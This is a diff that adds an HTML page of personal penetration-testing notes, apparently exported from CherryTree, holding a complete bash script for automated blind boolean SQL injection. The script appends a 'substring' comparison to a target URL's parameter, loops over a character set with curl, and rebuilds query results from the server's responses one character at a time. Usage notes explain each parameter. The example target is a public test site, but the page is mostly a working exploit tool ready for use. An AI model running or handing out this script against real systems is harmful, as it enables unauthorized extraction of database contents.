@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>scripts</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>scripts</h1><br/><br /><a href="https://osandamalith.com/2015/08/05/automated-blind-sql-injector/">https://osandamalith.com/2015/08/05/automated-blind-sql-injector/</a> (python,bash,java) see below<br /><br /><span style="text-decoration:underline;">Bash script (by Osanda Malith)</span> fater than the other<br /><code>./bssqli.sh </code><code><span style="color:#ff8700;">[maxlength] </span></code><code><span style="color:#00ff00;">[query]</span></code><br />   <div class="codebox"><pre>#!/bin/bash<br />#./bssqli.sh 20 &quot;select user()&quot;<br /><br />export URL=&quot;CHANGE ME!!!!!!: http://testphp.vulnweb.com/artists.php?artist=2&quot;<br />export truestring=&quot;CHANGE ME!!!!!!!: This is been a successfull query! &quot;<br />export maxlength=$1<br />export result=&quot;&quot;<br />export query=$2<br />charset=`echo {0..9} {A..x} \. \: \, \- \_ \@`<br /><br />for ((j=1;j&lt;$maxlength;j+=1)); do<br />	for i in $charset; do<br />		export str=`echo -n $i| od -A n -t x1 |sed &#39;s/ //g&#39;`<br />		export hex=0x$str<br />		curl -s &quot;$URL and substring(($query),$j,1)=$hex-- -&quot; | grep &quot;$truestring&quot; &amp;&gt; /dev/null<br />		if [ &quot;$?&quot; == &quot;0&quot; ]<br />		then<br />			echo Found: $i<br />			export result+=$i<br />			break<br />		fi<br />	done<br />done<br /><br />echo Result: $result</pre></div><br />      ▪ <span style="color:#ff8700;">maxlength</span> → first parameter of our command, this is the maximum expected length of the string that we want to extract<br />      ▪  <span style="color:#00ff00;">query</span> → second parameter of our command, is the result that we want to retrieve. It can give us max 1 result no more<br />         - for specific queries see <a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection">http://pentestmonkey.net/category/cheat-sheet/sql-injection</a><br />      ▪ charset → characters that we want to test<br />      ▪  truestring → The string returned by the Web server which our script expects to see when for true Boolean SQL queries.</div>
+</body>
+</html>
